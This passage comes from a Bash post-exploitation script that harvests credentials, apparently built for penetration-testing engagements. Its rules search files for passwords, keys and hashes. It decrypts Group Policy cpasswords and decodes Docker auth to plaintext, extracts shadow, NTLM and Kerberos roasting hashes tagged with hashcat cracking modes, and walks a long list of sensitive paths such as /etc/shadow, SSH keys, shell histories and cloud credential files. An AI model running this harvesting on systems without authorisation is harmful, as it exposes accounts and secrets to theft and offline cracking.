        path="$f" line_no="$lno" line_text="$match" match_text="$b64" key_name="cpassword"
      local plain
      plain="$(decrypt_gpp_cpassword "$b64" 2>/dev/null)"
      if [[ -n "$plain" ]]; then
        local printable=1
        case "$plain" in *[!\ -~]*) printable=0 ;; esac
        if [[ "$printable" -eq 1 && ${#plain} -ge 1 && ${#plain} -le 256 ]]; then
          emit_finding rule_id=gpp.cpassword.plaintext category=PASSWORD conf=HIGH base_conf=HIGH \
            path="$f" line_no="$lno" line_text="$match" match_text="$plain" key_name="decrypted"
        fi
      fi
    done
}

rule_shadow_hash() {
  local f="$1"
  grep -Eno -- '^[A-Za-z_][A-Za-z0-9_.-]{0,31}:\$(1|2[abxy]?|5|6|7|y|argon2(i|d|id))\$[A-Za-z0-9./$,=+-]{10,}:' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local user hash algo mode notes
      user="$(printf '%s' "$rest" | awk -F: '{print $1}')"
      hash="$(printf '%s' "$rest" | sed -E 's/^[^:]+:([^:]+):.*/\1/')"
      algo="$(printf '%s' "$hash" | sed -E 's/^\$([^$]+)\$.*/\1/')"
      case "$algo" in
        1)   mode="500"  ; notes="md5crypt - hashcat -m 500" ;;
        5)   mode="7400" ; notes="sha256crypt - hashcat -m 7400" ;;
        6)   mode="1800" ; notes="sha512crypt - hashcat -m 1800" ;;
        2a|2b|2x|2y) mode="3200" ; notes="bcrypt - hashcat -m 3200" ;;
        y)   mode="32500"; notes="yescrypt - john --format=crypt or hashcat newer builds" ;;
        7)   mode="33500"; notes="scrypt-derived - check format" ;;
        argon2i|argon2d|argon2id) mode="13900"; notes="argon2 - hashcat / argon2-cli" ;;
        *)   mode="?"    ; notes="algo=$algo - check hashcat example_hashes" ;;
      esac
      emit_finding rule_id=shadow.hash category="HASH:shadow" conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$hash" \
        key_name="user=$user algo=$algo mode=$mode" notes="$notes"
    done
}

rule_htpasswd() {
  local f="$1"
  case "$(basename "$f")" in
    .htpasswd|htpasswd|*.htpasswd) ;;
    *)
      grep -qE -- '^[A-Za-z0-9._-]+:\$(apr1|2[axyb]?)\$' "$f" 2>/dev/null || return 0
      ;;
  esac
  grep -Eno -- '^[A-Za-z0-9._-]+:(\$(apr1|2[axyb]?)\$[^:[:space:]]+|\{SHA\}[A-Za-z0-9+/=]{27,28}|[A-Za-z0-9./]{13})$' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local user hash algo notes
      user="$(printf '%s' "$rest" | awk -F: '{print $1}')"
      hash="$(printf '%s' "$rest" | sed -E 's/^[^:]+://')"
      algo="crypt-DES"
      case "$hash" in
        \$apr1\$*) algo="apr1-md5"; notes="hashcat -m 1600" ;;
        \$2a\$*|\$2b\$*|\$2y\$*) algo="bcrypt"; notes="hashcat -m 3200" ;;
        \$5\$*) algo="sha256crypt"; notes="hashcat -m 7400" ;;
        \$6\$*) algo="sha512crypt"; notes="hashcat -m 1800" ;;
        \{SHA\}*) algo="sha1-base64"; notes="hashcat -m 101" ;;
        *) algo="cryptDES"; notes="hashcat -m 1500" ;;
      esac
      emit_finding rule_id=htpasswd.line category="HASH:htpasswd" conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$hash" \
        key_name="user=$user algo=$algo" notes="$notes"
    done
}

rule_netntlmv2() {
  local f="$1"
  grep -Eno -- '[^:[:space:]]{1,64}::[^:[:space:]]{1,64}:[A-Fa-f0-9]{16}:[A-Fa-f0-9]{32}:[A-Fa-f0-9]{32,}' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local first
      first="$(printf '%s' "$rest" | grep -oE '[^:[:space:]]{1,64}::[^:[:space:]]{1,64}:[A-Fa-f0-9]{16}:[A-Fa-f0-9]{32}:[A-Fa-f0-9]{32,}' | head -1)"
      [[ -z "$first" ]] && continue
      emit_finding rule_id=netntlmv2 category="HASH:netntlmv2" conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$first" \
        notes="hashcat -m 5600 (NetNTLMv2)"
    done
}

rule_pwdump_ntlm() {
  local f="$1"
  grep -Eno -- '^[^:[:space:]]{1,255}:[0-9]+:[A-Fa-f0-9]{32}:[A-Fa-f0-9]{32}:::' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local user rid lm nt
      user="$(printf '%s' "$rest" | awk -F: '{print $1}')"
      rid="$(printf '%s' "$rest" | awk -F: '{print $2}')"
      lm="$(printf '%s' "$rest" | awk -F: '{print $3}')"
      nt="$(printf '%s' "$rest" | awk -F: '{print $4}')"
      emit_finding rule_id=pwdump.ntlm category="HASH:ntlm" conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$nt" \
        key_name="user=$user rid=$rid lm=$lm" notes="hashcat -m 1000 (NTLM)"
    done
}

rule_krb5_asrep() {
  local f="$1"
  grep -Eno -- '\$krb5asrep\$(17|18|23)\$[^:[:space:]]{1,255}:[A-Fa-f0-9]{16,}\$[A-Fa-f0-9]{32,}' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local m
      m="$(printf '%s' "$rest" | grep -oE '\$krb5asrep\$(17|18|23)\$[^:[:space:]]{1,255}:[A-Fa-f0-9]{16,}\$[A-Fa-f0-9]{32,}' | head -1)"
      [[ -z "$m" ]] && continue
      emit_finding rule_id=krb5.asrep category="HASH:krb5asrep" conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$m" \
        notes="hashcat -m 18200 (AS-REP roasting)"
    done
}

rule_krb5_tgs() {
  local f="$1"
  grep -Eno -- '\$krb5tgs\$(17|18|23)\$\*[^*[:space:]]{1,255}\*\$[A-Fa-f0-9]{16,}\$[A-Fa-f0-9]{32,}' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local m
      m="$(printf '%s' "$rest" | grep -oE '\$krb5tgs\$(17|18|23)\$\*[^*[:space:]]{1,255}\*\$[A-Fa-f0-9]{16,}\$[A-Fa-f0-9]{32,}' | head -1)"
      [[ -z "$m" ]] && continue
      emit_finding rule_id=krb5.tgs category="HASH:krb5tgs" conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$m" \
        notes="hashcat -m 13100 (TGS Kerberoasting)"
    done
}

rule_uri_basic_creds() {
  local f="$1"
  grep -Eno -- '\b(mongodb(\+srv)?|postgres(ql)?|mysql|mariadb|redis(s)?|amqps?|ldaps?|ftps?|sftp|ssh|mssql|https?|jdbc:[a-z0-9]+)://[^/[:space:]:@"]{1,128}:[^/[:space:]@"]{1,255}@[^[:space:]"]{1,255}' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local uri scheme userpart pwd host_part
      uri="$(printf '%s' "$rest" | grep -oE '\b(mongodb(\+srv)?|postgres(ql)?|mysql|mariadb|redis(s)?|amqps?|ldaps?|ftps?|sftp|ssh|mssql|https?|jdbc:[a-z0-9]+)://[^/[:space:]:@"]{1,128}:[^/[:space:]@"]{1,255}@[^[:space:]"]{1,255}' | head -1)"
      [[ -z "$uri" ]] && continue
      scheme="$(printf '%s' "$uri" | sed -E 's|://.*||')"
      userpart="$(printf '%s' "$uri" | sed -E 's|^[^:]+://([^@]*)@.*|\1|')"
      pwd="$(printf '%s' "$userpart" | sed -E 's/^[^:]*://')"
      host_part="$(printf '%s' "$uri" | sed -E 's|^[^:]+://[^@]*@||')"
      pwd="$(url_decode "$pwd")"
      if is_placeholder "$pwd"; then
        emit_finding rule_id=uri.basic_creds category=URI_CREDS conf=LOW base_conf=HIGH \
          path="$f" line_no="$lno" line_text="$rest" match_text="$uri" \
          key_name="scheme=$scheme host=$host_part" fp_reason="placeholder"
      else
        emit_finding rule_id=uri.basic_creds category=URI_CREDS conf=HIGH base_conf=HIGH \
          path="$f" line_no="$lno" line_text="$rest" match_text="$uri" \
          key_name="scheme=$scheme host=$host_part"
      fi
    done
}

rule_netrc() {
  local f="$1"
  grep -iEno -- '^[[:space:]]*machine[[:space:]]+[^[:space:]]+[[:space:]]+login[[:space:]]+[^[:space:]]+[[:space:]]+password[[:space:]]+[^[:space:]]{1,255}' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local machine login pwd
      machine="$(printf '%s' "$rest" | awk '{for(i=1;i<=NF;i++) if(tolower($i)=="machine") {print $(i+1); exit}}')"
      login="$(printf '%s' "$rest" | awk '{for(i=1;i<=NF;i++) if(tolower($i)=="login") {print $(i+1); exit}}')"
      pwd="$(printf '%s' "$rest" | awk '{for(i=1;i<=NF;i++) if(tolower($i)=="password") {print $(i+1); exit}}')"
      [[ -z "$pwd" ]] && continue
      local conf="HIGH" fp=""
      if is_placeholder "$pwd"; then conf="LOW"; fp="placeholder"; fi
      emit_finding rule_id=netrc category=PASSWORD conf="$conf" base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$pwd" \
        key_name="machine=$machine login=$login" fp_reason="$fp"
    done
}

rule_pgpass() {
  local f="$1"
  case "$(basename "$f")" in
    .pgpass|pgpass|pgpass.conf) ;;
    *) return 0 ;;
  esac
  grep -Eno -- '^[^#:[:space:]]{1,}:[^:]*:[^:]*:[^:]+:[^:]+$' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local host port db user pwd
      host="$(printf '%s' "$rest" | awk -F: '{print $1}')"
      port="$(printf '%s' "$rest" | awk -F: '{print $2}')"
      db="$(printf '%s' "$rest"   | awk -F: '{print $3}')"
      user="$(printf '%s' "$rest" | awk -F: '{print $4}')"
      pwd="$(printf '%s' "$rest"  | awk -F: '{for (i=5;i<=NF;i++){printf "%s%s", $i, (i<NF?":":"")}}')"
      [[ -z "$pwd" ]] && continue
      local conf="HIGH" fp=""
      if is_placeholder "$pwd"; then conf="LOW"; fp="placeholder"; fi
      emit_finding rule_id=pgpass category=PASSWORD conf="$conf" base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$pwd" \
        key_name="host=$host port=$port db=$db user=$user" fp_reason="$fp"
    done
}

rule_mycnf_password() {
  local f="$1"
  awk 'BEGIN{ in_sec=0; sec="" }
       /^[[:space:]]*\[(client|mysql|mysqldump|mariadb|mysqld_safe|mysqladmin|mysqlimport)\][[:space:]]*$/ {
         in_sec=1
         match($0, /\[[^]]+\]/)
         sec=substr($0, RSTART+1, RLENGTH-2)
         next
       }
       /^[[:space:]]*\[/ { in_sec=0; sec=""; next }
       in_sec==1 && $0 ~ /^[[:space:]]*password[[:space:]]*=/ {
         print NR ":" sec ":" $0
       }' "$f" 2>/dev/null \
  | while IFS=: read -r lno sec rest; do
      local val
      val="$(printf '%s' "$rest" | sed -E 's/^[[:space:]]*password[[:space:]]*=[[:space:]]*//; s/[[:space:]]*$//')"
      local stripped="${val%\"}"; stripped="${stripped#\"}"
      stripped="${stripped%\'}"; stripped="${stripped#\'}"
      [[ -z "$stripped" ]] && continue
      local conf="HIGH" fp=""
      if is_placeholder "$stripped"; then conf="LOW"; fp="placeholder"; fi
      emit_finding rule_id=mycnf.password category=PASSWORD conf="$conf" base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$stripped" \
        key_name="section=$sec" fp_reason="$fp"
    done
}

rule_tomcat_user() {
  local f="$1"
  grep -iEno -- '<user[^>]*[[:space:]]password[[:space:]]*=[[:space:]]*"[^"]{1,255}"' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local pwd uname
      pwd="$(printf '%s' "$rest" | grep -oiE 'password[[:space:]]*=[[:space:]]*"[^"]*"' | head -1 | sed -E 's/.*=[[:space:]]*"([^"]*)"/\1/')"
      uname="$(printf '%s' "$rest" | grep -oiE 'username[[:space:]]*=[[:space:]]*"[^"]*"' | head -1 | sed -E 's/.*=[[:space:]]*"([^"]*)"/\1/')"
      pwd="$(html_decode "$pwd")"
      [[ -z "$pwd" ]] && continue
      local conf="HIGH" fp=""
      if is_placeholder "$pwd"; then conf="LOW"; fp="placeholder"; fi
      emit_finding rule_id=tomcat.user category=PASSWORD conf="$conf" base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$pwd" \
        key_name="username=$uname" fp_reason="$fp"
    done
}

rule_cisco_secret() {
  local f="$1"
  grep -iEno -- '^[[:space:]]*(enable[[:space:]]+)?(secret|password)[[:space:]]+(0|5|7|8|9)[[:space:]]+[^[:space:]]{4,255}[[:space:]]*$' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local kind level val notes
      kind="$(printf '%s' "$rest" | awk '{for(i=1;i<=NF;i++){l=tolower($i); if(l=="secret"||l=="password"){print l; exit}}}')"
      level="$(printf '%s' "$rest" | awk '{for(i=1;i<=NF;i++){l=tolower($i); if(l=="secret"||l=="password"){print $(i+1); exit}}}')"
      val="$(printf '%s' "$rest" | awk '{for(i=1;i<=NF;i++){l=tolower($i); if(l=="secret"||l=="password"){print $(i+2); exit}}}')"
      case "$level" in
        0) notes="cleartext" ;;
        5) notes="md5crypt - hashcat -m 500" ;;
        7) notes="cisco type 7 (XOR key dsfd;kfoA,.iyewrkldJKDHSUB)" ;;
        8) notes="pbkdf2-sha256 - hashcat -m 9200" ;;
        9) notes="scrypt - hashcat -m 9300" ;;
      esac
      emit_finding rule_id=cisco.secret category="HASH:cisco" conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$val" \
        key_name="kind=$kind level=$level" notes="$notes"
    done
}

rule_dotnet_connstr() {
  local f="$1"
  grep -iEno -- '(server|data source)[[:space:]]*=[[:space:]]*[^;]+;[^"]*(user[[:space:]]*id|uid)[[:space:]]*=[^;]+;[^"]*(password|pwd)[[:space:]]*=[^;"]{1,255}' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local match pwd server
      match="$(printf '%s' "$rest" | grep -ioE '(server|data source)[[:space:]]*=[[:space:]]*[^;]+;[^"]*(user[[:space:]]*id|uid)[[:space:]]*=[^;]+;[^"]*(password|pwd)[[:space:]]*=[^;"]+' | head -1)"
      [[ -z "$match" ]] && continue
      pwd="$(printf '%s' "$match" | grep -ioE '(password|pwd)[[:space:]]*=[^;"]+' | head -1 | sed -E 's/^(password|pwd)[[:space:]]*=[[:space:]]*//I')"
      server="$(printf '%s' "$match" | grep -ioE '(server|data source)[[:space:]]*=[^;]+' | head -1 | sed -E 's/^(server|data source)[[:space:]]*=[[:space:]]*//I')"
      local conf="HIGH" fp=""
      if is_placeholder "$pwd"; then conf="LOW"; fp="placeholder"; fi
      emit_finding rule_id=dotnet.connstr category=PASSWORD conf="$conf" base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$pwd" \
        key_name="server=$server" fp_reason="$fp"
    done
}

rule_jdbc_password() {
  local f="$1"
  grep -iEno -- 'jdbc:[a-z0-9]+://[^?[:space:]"]+\?[^"]*(password|pwd)=[^&"]{1,255}' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local match pwd
      match="$(printf '%s' "$rest" | grep -ioE 'jdbc:[a-z0-9]+://[^?[:space:]"]+\?[^"]*(password|pwd)=[^&"]+' | head -1)"
      [[ -z "$match" ]] && continue
      pwd="$(printf '%s' "$match" | grep -ioE '(password|pwd)=[^&"]+' | head -1 | sed -E 's/^(password|pwd)=//I')"
      pwd="$(url_decode "$pwd")"
      local conf="HIGH" fp=""
      if is_placeholder "$pwd"; then conf="LOW"; fp="placeholder"; fi
      emit_finding rule_id=jdbc.password category=PASSWORD conf="$conf" base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$pwd" fp_reason="$fp"
    done
}

rule_ps_securestring() {
  local f="$1"
  grep -iEno -- 'ConvertTo-SecureString[[:space:]]+(-String[[:space:]]+)?["'"'"'][^"'"'"']{4,255}["'"'"'][[:space:]]+(-AsPlainText[[:space:]]+-Force|-Force[[:space:]]+-AsPlainText)' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local pwd
      pwd="$(printf '%s' "$rest" | grep -ioE 'ConvertTo-SecureString[[:space:]]+(-String[[:space:]]+)?["'"'"'][^"'"'"']+["'"'"']' | head -1 | sed -E 's/.*["'"'"']([^"'"'"']+)["'"'"']/\1/')"
      [[ -z "$pwd" ]] && continue
      local conf="HIGH" fp=""
      if is_placeholder "$pwd"; then conf="LOW"; fp="placeholder"; fi
      emit_finding rule_id=ps.securestring_plain category=PASSWORD conf="$conf" base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$pwd" fp_reason="$fp"
    done
}

rule_docker_auth() {
  local f="$1"
  grep -Eno -- '"auth"[[:space:]]*:[[:space:]]*"[A-Za-z0-9+/=]{8,}"' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      local b64 decoded
      b64="$(printf '%s' "$rest" | grep -oE '"auth"[[:space:]]*:[[:space:]]*"[A-Za-z0-9+/=]+"' | head -1 | sed -E 's/.*"([A-Za-z0-9+/=]+)"$/\1/')"
      [[ -z "$b64" ]] && continue
      emit_finding rule_id=docker.auth category="STORED_CRED:docker" conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$b64" key_name="docker_auth_b64"
      decoded="$(decode_b64_simple "$b64")"
      if [[ -n "$decoded" ]]; then
        case "$decoded" in
          *:*) emit_finding rule_id=docker.auth.plaintext category=URI_CREDS conf=HIGH base_conf=HIGH \
                 path="$f" line_no="$lno" line_text="$rest" match_text="$decoded" \
                 key_name="user:password" ;;
        esac
      fi
    done
}

rule_ansible_vault_header() {
  local f="$1"
  grep -Eno -- '^\$ANSIBLE_VAULT;[0-9]+\.[0-9]+;AES256' "$f" 2>/dev/null \
  | while IFS=: read -r lno rest; do
      emit_finding rule_id=ansible.vault_header category=REFERENCE conf=MEDIUM base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$rest" match_text="$rest" \
        notes="encrypted vault - ask engagement team for vault password; offline crack: ansible2john + hashcat -m 16900"
    done
}

rule_generic_assign() {
  local f="$1"
  case "$(basename "$f")" in
    *.pem|*.ppk|*.kdbx|*.kdb|*.pfx|*.p12|*.jks|*.keystore) return 0 ;;
  esac
  grep -iEHno -- '\b(password|passwd|pwd|pass|passphrase|secret|credential|credentials|creds|requirepass|bindpw|db[_-]?pass(word)?|smtp[_-]?pass(word)?|ansible[_-]?(ssh[_-]?pass|become[_-]?pass|password)|admin[_-]?pass(word)?|root[_-]?pass(word)?|master[_-]?pass(word)?|api[_-]?secret|client[_-]?secret)\b[[:space:]]*(=|:=|=>|:)[[:space:]]*["'"'"'`]?[^[:space:]"'"'"'`#]{1,255}' "$f" 2>/dev/null \
  | while IFS= read -r line; do
      local before lno rest
      before="${line%%:*}"; rest="${line#*:}"
      lno="${rest%%:*}"; rest="${rest#*:}"
      [[ -z "$rest" ]] && continue

      case "$rest" in
        *cpassword=\"*|*PuTTY-User-Key-File-*) continue ;;
      esac

      local key val
      key="$(printf '%s' "$rest" | grep -ioE '\b(password|passwd|pwd|pass|passphrase|secret|credential|credentials|creds|requirepass|bindpw|db[_-]?pass(word)?|smtp[_-]?pass(word)?|ansible[_-]?(ssh[_-]?pass|become[_-]?pass|password)|admin[_-]?pass(word)?|root[_-]?pass(word)?|master[_-]?pass(word)?|api[_-]?secret|client[_-]?secret)\b' | head -1)"
      [[ -z "$key" ]] && continue
      val="$(printf '%s' "$rest" | sed -E "s/.*\b(password|passwd|pwd|pass|passphrase|secret|credential|credentials|creds|requirepass|bindpw|db[_-]?pass(word)?|smtp[_-]?pass(word)?|ansible[_-]?(ssh[_-]?pass|become[_-]?pass|password)|admin[_-]?pass(word)?|root[_-]?pass(word)?|master[_-]?pass(word)?|api[_-]?secret|client[_-]?secret)\b[[:space:]]*(=|:=|=>|:)[[:space:]]*([\"'\''\`])?//I" | sed -E "s/[\"'\\\`].*//; s/[[:space:]]*#.*//; s/[[:space:]]+\$//")"
      [[ -z "$val" ]] && continue

      local conf="HIGH" base_conf="HIGH" demotions="" fp=""

      if is_placeholder "$val"; then
        conf="LOW"; fp="placeholder"
      elif is_env_ref "$val"; then
        conf="LOW"; fp="env_reference"; demotions+="env_reference,"
      elif is_identifier "$val"; then
        case "$rest" in
          *\"*\"*|*\'*\'*) : ;;
          *) conf="LOW"; fp="variable_reference" ;;
        esac
      fi

      if [[ "$fp" == "" ]]; then
        local vlen=${#val}
        if [[ "$vlen" -lt 4 ]]; then
          conf="LOW"; fp="too_short"
        elif [[ "$vlen" -gt 512 ]]; then
          conf="LOW"; fp="too_long_likely_blob"
        else
          if is_comment "$rest"; then
            conf="$(demote_tier "$conf")"
            demotions+="comment,"
          fi
          if is_test_path "$f"; then
            conf="$(demote_tier "$conf")"
            demotions+="test_path,"
          fi
          local H lenb
          H="$(entropy "$val")"
          lenb=${#val}
          if (( lenb >= 4 && lenb <= 7 )); then
            if awk -v h="$H" 'BEGIN{exit !(h+0 < 3.0)}'; then
              conf="$(demote_tier "$conf")"
              demotions+="entropy_low,"
            fi
          elif (( lenb >= 8 && lenb <= 15 )); then
            if awk -v h="$H" 'BEGIN{exit !(h+0 < 2.0)}'; then
              conf="LOW"
              demotions+="entropy_low,"
            fi
          elif (( lenb >= 16 && lenb <= 31 )); then
            if awk -v h="$H" 'BEGIN{exit !(h+0 < 2.5)}'; then
              conf="$(demote_tier "$conf")"
              demotions+="entropy_low,"
            fi
          elif (( lenb >= 32 )); then
            if awk -v h="$H" 'BEGIN{exit !(h+0 < 3.0)}'; then
              conf="$(demote_tier "$conf")"
              demotions+="entropy_low,"
            fi
          fi
        fi
      fi

      local ent_val
      ent_val="$(entropy "$val")"
      emit_finding rule_id=pw.assign.generic category=PASSWORD conf="$conf" base_conf="$base_conf" \
        path="$f" line_no="$lno" line_text="$rest" match_text="$val" key_name="$key" \
        fp_reason="$fp" entropy="$ent_val" demotions="${demotions%,}"
    done
}

scan_file_content() {
  local f="$1"
  [[ -z "$f" || ! -e "$f" ]] && return 0
  [[ ! -r "$f" ]] && { printf '%s\tperm\n' "$f" >> "$SKIPPED_LOG"; return 0; }
  if is_excluded "$f"; then return 0; fi
  if seen_inode_check "$f"; then return 0; fi
  if ! size_under_cap "$f" "$MAX_SIZE"; then
    printf '%s\toversize\n' "$f" >> "$SKIPPED_LOG"
    return 0
  fi
  if is_binary "$f"; then
    printf '%s\tbinary\n' "$f" >> "$SKIPPED_LOG"
    return 0
  fi

  rule_pem "$f"
  rule_ppk "$f"
  rule_wireguard "$f"
  rule_gpp_cpassword "$f"
  rule_shadow_hash "$f"
  rule_htpasswd "$f"
  rule_netntlmv2 "$f"
  rule_pwdump_ntlm "$f"
  rule_krb5_asrep "$f"
  rule_krb5_tgs "$f"
  rule_uri_basic_creds "$f"
  rule_netrc "$f"
  rule_pgpass "$f"
  rule_mycnf_password "$f"
  rule_tomcat_user "$f"
  rule_cisco_secret "$f"
  rule_dotnet_connstr "$f"
  rule_jdbc_password "$f"
  rule_ps_securestring "$f"
  rule_docker_auth "$f"
  rule_ansible_vault_header "$f"
  rule_generic_assign "$f"
}

KNOWN_PATHS=(
  '/home/*/.bash_history' '/home/*/.zsh_history' '/home/*/.ash_history'
  '/home/*/.sh_history' '/home/*/.history'
  '/home/*/.local/share/fish/fish_history'
  '/home/*/.python_history' '/home/*/.node_repl_history' '/home/*/.irb_history'
  '/home/*/.lua_history' '/home/*/.psql_history' '/home/*/.mysql_history'
  '/home/*/.sqlite_history' '/home/*/.rediscli_history' '/home/*/.mongo_history'
  '/home/*/.lesshst' '/home/*/.viminfo'
  '/root/.bash_history' '/root/.zsh_history' '/root/.history'
  '/root/.mysql_history' '/root/.psql_history' '/root/.python_history'
  '/root/.lesshst' '/root/.viminfo'

  '/home/*/.ssh' '/root/.ssh'
  '/etc/ssh/sshd_config' '/etc/ssh/ssh_config'
  '/etc/ssh/ssh_host_rsa_key' '/etc/ssh/ssh_host_ed25519_key'
  '/etc/ssh/ssh_host_ecdsa_key' '/etc/ssh/ssh_host_dsa_key'
  '/etc/ssh/ssh_config.d'

  '/etc/shadow' '/etc/gshadow' '/etc/passwd' '/etc/master.passwd'
  '/etc/sudoers' '/etc/sudoers.d' '/etc/login.defs' '/etc/securetty'
  '/etc/security/opasswd' '/etc/pam.d'
  '/etc/krb5.keytab' '/etc/krb5.conf' '/var/lib/krb5kdc'
  '/tmp/krb5cc_*' '/var/backups'

  '/etc/mysql' '/home/*/.my.cnf' '/root/.my.cnf'
  '/etc/postgresql' '/home/*/.pgpass' '/root/.pgpass'
  '/etc/redis/redis.conf' '/etc/redis-sentinel.conf' '/etc/mongod.conf'
  '/etc/clickhouse-server'
  '/etc/elasticsearch'
  '/etc/influxdb/influxdb.conf' '/etc/couchdb/local.ini'

  '/etc/samba' '/var/lib/samba/private'
  '/etc/dovecot' '/etc/postfix/main.cf' '/etc/postfix/sasl_passwd'
  '/etc/postfix/master.cf' '/etc/exim4/passwd.client' '/etc/sasldb2'

  '/etc/openvpn' '/etc/wireguard' '/etc/ipsec.secrets' '/etc/ipsec.conf'
  '/etc/swanctl' '/etc/strongswan.d'
  '/etc/freeradius' '/etc/raddb'
  '/etc/bind' '/etc/named.conf' '/etc/rndc.key' '/etc/rndc.conf'
  '/etc/snmp/snmpd.conf'
  '/etc/proftpd' '/etc/vsftpd.conf' '/etc/pure-ftpd'
  '/etc/cups'

  '/etc/sssd/sssd.conf' '/etc/nslcd.conf'
  '/etc/openldap' '/etc/ldap' '/etc/pam_ldap'

  '/etc/apache2' '/etc/httpd' '/etc/nginx' '/etc/lighttpd' '/etc/caddy'
  '/etc/haproxy'

  '/var/lib/jenkins/credentials.xml' '/var/lib/jenkins/users'
  '/var/lib/jenkins/secrets'
  '/var/lib/jenkins/jobs'
  '/etc/gitlab/gitlab.rb' '/etc/gitlab/gitlab-secrets.json'
  '/home/*/.docker/config.json' '/root/.docker/config.json' '/etc/docker/daemon.json'
  '/home/*/.kube/config' '/root/.kube/config'
  '/etc/kubernetes/admin.conf' '/etc/kubernetes/kubelet.conf'
  '/var/lib/kubelet/config.yaml'
  '/etc/rancher'
  '/home/*/.aws/credentials' '/home/*/.aws/config'
  '/root/.aws/credentials' '/root/.aws/config'
  '/home/*/.azure' '/root/.azure'
  '/home/*/.config/gcloud' '/root/.config/gcloud'
  '/home/*/.config/rclone/rclone.conf' '/root/.config/rclone/rclone.conf'
  '/home/*/.config/helm/repositories.yaml' '/root/.config/helm/repositories.yaml'
  '/home/*/.netrc' '/root/.netrc' '/home/*/_netrc'
  '/home/*/.git-credentials' '/root/.git-credentials'
  '/home/*/.npmrc' '/root/.npmrc'
  '/home/*/.m2/settings.xml' '/root/.m2/settings.xml'
  '/home/*/.gradle/gradle.properties' '/root/.gradle/gradle.properties'
  '/home/*/.composer/auth.json' '/root/.composer/auth.json'
  '/home/*/.pypirc' '/root/.pypirc'
  '/home/*/.gem/credentials' '/root/.gem/credentials'
  '/home/*/.bundle/config' '/root/.bundle/config'
  '/home/*/.subversion/auth/svn.simple' '/root/.subversion/auth/svn.simple'
  '/home/*/.hgrc' '/root/.hgrc'
  '/home/*/.gitconfig' '/root/.gitconfig'
  '/home/*/.chef/knife.rb' '/root/.chef/knife.rb'

  '/etc/ansible' '/srv/pillar' '/srv/salt' '/etc/salt'
  '/etc/puppet' '/etc/puppetlabs'

  '/etc/crontab' '/etc/cron.d' '/etc/cron.hourly' '/etc/cron.daily'
  '/etc/cron.weekly' '/etc/cron.monthly' '/etc/anacrontab'
  '/var/spool/cron'
  '/etc/at.allow' '/etc/at.deny' '/var/spool/at'
  '/etc/systemd/system' '/lib/systemd/system' '/usr/lib/systemd/system'
  '/etc/init.d' '/etc/rc.local' '/etc/default' '/etc/sysconfig'
)

scan_known_path() {
  local f="$1"
  [[ -z "$f" || ! -e "$f" ]] && return 0
  [[ ! -r "$f" ]] && { printf '%s\tperm\n' "$f" >> "$SKIPPED_LOG"; return 0; }
  if [[ ! -f "$f" ]]; then return 0; fi

  local base
  base="$(basename "$f")"
  case "$f" in
    *id_rsa|*id_dsa|*id_ecdsa|*id_ed25519|*id_xmss|*identity|*.pem|*.ppk|*.kdbx|*.kdb|*.pfx|*.p12|*.jks|*.keystore|*krb5.keytab|*.keytab)
      emit_finding rule_id=class_a.file_present category=PRIVATE_KEY conf=HIGH base_conf=HIGH \
        path="$f" line_no=0 match_text="$base" notes="known credential file present"
      ;;
  esac
  case "$base" in
    .netrc|_netrc|.pgpass|.my.cnf|.mylogin.cnf|.htpasswd|.git-credentials|.npmrc|.yarnrc|.yarnrc.yml|credentials|config.json|kubeconfig|admin.conf|kubelet.conf|shadow|gshadow|sudoers|opasswd|sasl_passwd|secrets.tdb|passdb.tdb|rclone.conf|gitlab.rb|gitlab-secrets.json|master.key|hudson.util.Secret|initialAdminPassword|Groups.xml|Services.xml|ScheduledTasks.xml|Drives.xml|Printers.xml|DataSources.xml|*.ovpn|wg0.conf|ipsec.secrets|ConsoleHost_history.txt)
      emit_finding rule_id=class_a.file_present category=STORED_CRED conf=HIGH base_conf=HIGH \
        path="$f" line_no=0 match_text="$base" notes="known credential file present"
      ;;
  esac
  case "$f" in /var/backups/*shadow*|/var/backups/*passwd*|/var/backups/*gshadow*)
    emit_finding rule_id=class_a.file_present category="HASH:shadow" conf=HIGH base_conf=HIGH \
      path="$f" line_no=0 match_text="$base" notes="shadow/passwd backup"
    ;;
  esac

  if ! is_binary "$f"; then
    scan_file_content "$f"
  fi
}

scan_proc_environ() {
  local f="$1"
  [[ ! -r "$f" ]] && return 0
  local pid
  pid="$(basename "$(dirname "$f")")"
